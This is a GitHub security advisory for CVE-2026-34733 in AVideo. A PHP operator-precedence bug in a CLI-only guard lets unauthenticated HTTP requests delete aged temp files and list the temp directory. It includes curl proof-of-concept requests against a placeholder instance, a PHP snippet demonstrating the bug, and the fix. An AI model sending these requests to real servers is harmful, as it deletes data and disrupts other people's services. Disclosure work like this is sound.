# [M] AVideo: Unauthenticated File Deletion via PHP Operator Precedence Bug in CLI Guard

## Summary
Severity: Medium
Advisory: GHSA-wwpw-hrx8-79r5
CVE: CVE-2026-34733
CWE: CWE-284
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-wwpw-hrx8-79r5
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The AVideo installation script `install/deleteSystemdPrivate.php` contains a PHP operator precedence bug in its CLI-only access guard. The script is intended to run exclusively from the command line, but the guard condition `!php_sapi_name() === 'cli'` never evaluates to true due to how PHP resolves operator precedence. The `!` (logical NOT) operator binds more tightly than `===` (strict comparison), causing the expression to always evaluate to `false`, which means the `die()` statement never executes. As a result, the script is accessible via HTTP without authentication and will delete files from the server's temp directory while also disclosing the temp directory contents in its response.

## Details

The faulty guard is at lines 2-4 of the script:

```php
// install/deleteSystemdPrivate.php:2-4
if (!php_sapi_name() === 'cli') {
    die('Command Line only');
}
```

Due to PHP operator precedence, this expression is parsed as:

```php
if ((!php_sapi_name()) === 'cli') {
```

Step-by-step evaluation when accessed via HTTP (Apache/nginx with mod_php or php-fpm):

1. `php_sapi_name()` returns `"apache2handler"` (or `"fpm-fcgi"`, etc.) - a non-empty string
2. `!php_sapi_name()` applies logical NOT to a truthy string, yielding `false`
3. `false === 'cli'` is a strict comparison between a boolean and a string, which is always `false`
4. The `if` body (`die()`) is never entered

The correct code should be:

```php
if (php_sapi_name() !== 'cli') {
    die('Command Line only');
}
```

After the bypassed guard, the script enumerates and deletes aged files from the system temp directory:

```php
$glob = glob(sys_get_temp_dir() . "/*");
// ...
foreach ($glob as $file) {
    if (filemtime($file) < $one_day_ago) {
        unlink($file);  // Deletes the file
    }
}
```

The script also outputs the total number of items found and details about processed files, leaking information about the temp directory contents.

Confirmed on a live instance: an unauthenticated HTTP GET request returned HTTP 200 with the response body including "Found total of 91 items", confirming the guard bypass and information disclosure.

## Proof of Concept

**Step 1:** Verify the endpoint is accessible without authentication:

```bash
curl -v "https://your-avideo-instance.com/install/deleteSystemdPrivate.php"
```

Expected response (HTTP 200):

```
Found total of 91 items
Processing /tmp/phpXXXXXX ...
Deleted: /tmp/old_session_file ...
```

If the guard were working correctly, the response would be:

```
Command Line only
```

**Step 2:** Demonstrate the PHP operator precedence bug locally:

```php
<?php
// Simulates the bug
$sapi = 'apache2handler'; // non-CLI SAPI

// Buggy check (as written in deleteSystemdPrivate.php)
var_dump(!$sapi === 'cli');
// Output: bool(false) - guard never triggers

// Correct check
var_dump($sapi !== 'cli');
// Output: bool(true) - guard would trigger correctly
?>
```

**Step 3:** Monitor the effect by checking before and after:

```bash
# Check initial state
curl -s "https://your-avideo-instance.com/install/deleteSystemdPrivate.php" | head -1
# Output: "Found total of 91 items"

# Wait and check again - files older than 24 hours will have been deleted
curl -s "https://your-avideo-instance.com/install/deleteSystemdPrivate.php" | head -1
# Output: "Found total of 47 items" (fewer items after deletion)
```

## Impact

An unauthenticated attacker can trigger deletion of files in the server's system temp directory by simply sending an HTTP request to this endpoint. The impact includes:

- **File deletion**: Any files in the temp directory older than 24 hours are deleted. This can disrupt server operations by removing PHP session files, upload temp files, cache files, or files used by other applications sharing the same temp directory.
- **Information disclosure**: The script's output reveals the full path of the temp directory and enumerates its contents, including file names and counts. This can expose internal server paths, session file names, and the presence of other applications.
- **Denial of service**: Repeated requests can be used to continuously purge temp files, interfering with file uploads, session management, and other temp-dependent operations.

The root cause is a common PHP pitfall where the logical NOT operator (`!`) has higher precedence than strict comparison (`===`), causing the intended CLI-only guard to be completely ineffective.

- **CWE-284**: Improper Access Control
- **Severity**: Medium

## Recommended Fix

Fix the operator precedence bug at `install/deleteSystemdPrivate.php:2` by replacing the negation with the `!==` operator:

```php
// install/deleteSystemdPrivate.php:2
// Before (broken - always evaluates to false):
if (!php_sapi_name() === 'cli') {

// After (correct):
if (php_sapi_name() !== 'cli') {
```

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-wwpw-hrx8-79r5
- https://nvd.nist.gov/vuln/detail/CVE-2026-34733
- https://github.com/WWBN/AVideo/commit/355e8c70806694b3bf8605d75e1bd1c695cd95e7
- https://github.com/WWBN/AVideo
